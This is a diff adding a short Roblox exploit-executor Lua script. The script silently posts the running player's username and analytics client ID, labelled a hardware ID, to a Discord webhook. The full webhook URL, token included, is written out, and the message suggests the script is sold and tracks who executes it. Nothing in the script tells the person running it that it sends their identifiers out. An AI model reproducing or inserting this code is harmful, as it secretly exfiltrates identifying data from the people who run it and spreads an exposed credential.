@@ -1,0 +1,26 @@
+local http_request = syn and syn.request or http and http.request or http_request or request or httprequest
+local Webhook_URL = "https://discord.com/api/webhooks/1256532395834867732/LfM1DUGdsgWyPrJfyRJ33Z87Arh3wFG15kq4XbraZTf35_V0iEvi1UvHs-R0eQUEA-4T"
+
+local response = http_request({
+    Url = Webhook_URL,
+    Method = "POST",
+    Headers = {
+        ["Content-Type"] = "application/json"
+    },
+    Body = game.HttpService:JSONEncode({
+        ["content"] = "",
+        ["embeds"] = {{
+            ["title"] = "**HWID RECEIVER**",
+            ["description"] = game.Players.LocalPlayer.Name .. " Executed script, buyers?",
+            ["type"] = "rich",
+            ["color"] = tonumber("0xffffff"),
+            ["fields"] = {{
+                ["name"] = "Hardware ID * HWID>",
+                ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
+                ["inline"] = true
+            }}
+        }}
+    })
+})
+
+print(response) -- varbose
